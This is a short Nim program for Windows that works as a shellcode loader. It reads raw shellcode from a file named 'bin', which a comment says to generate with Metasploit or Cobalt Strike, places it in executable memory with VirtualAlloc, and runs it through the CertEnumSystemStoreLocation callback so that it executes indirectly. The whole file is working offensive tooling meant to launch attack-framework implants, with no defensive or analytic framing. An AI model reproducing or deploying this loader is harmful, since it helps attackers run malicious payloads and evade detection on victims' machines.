import winim/lean


proc count1 (realshellcode:openArray[byte]): void=
  let tProcess = GetCurrentProcessId()

  # echo "[*] Target Process: ", tProcess

  # Allocate memory
  let rPtr = VirtualAlloc(
      nil,
      cast[SIZE_T](realshellcode.len),
      MEM_COMMIT,
      PAGE_EXECUTE_READ_WRITE
  )
  # Copy Shellcode to the allocated memory section
  copyMem(rPtr,unsafeAddr realshellcode,cast[SIZE_T](realshellcode.len))
  
  # Callback execution
  var dwordvar: DWORD
  CertEnumSystemStoreLocation(
  dwordvar,
  nil,
  cast[PFN_CERT_ENUM_SYSTEM_STORE_LOCATION](rPtr)
  )


when isMainModule:
  # echo "[*] Running in x64 process"
  # var shellcode: array[510, byte] 
  # generate a msf or cs raw file
  var f = open(r"bin",fmRead)
  var shellcode:array[1000,byte]
  var finallen = readBytes(f,shellcode,0,len(shellcode))-1

  f.close()
  var realshellcode =  shellcode[0 .. finallen]
  count1(realshellcode)
